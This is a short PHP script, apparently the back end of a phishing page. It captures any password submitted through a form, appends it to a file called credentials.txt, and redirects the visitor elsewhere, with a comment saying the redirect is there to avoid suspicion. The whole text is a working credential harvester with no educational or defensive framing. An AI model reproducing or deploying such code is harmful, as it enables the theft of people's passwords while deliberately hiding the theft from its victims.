<?php
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    file_put_contents('credentials.txt', $password . "\n", FILE_APPEND);
    header("Location: http://example.com"); // Redirect to avoid suspicion
}
?>
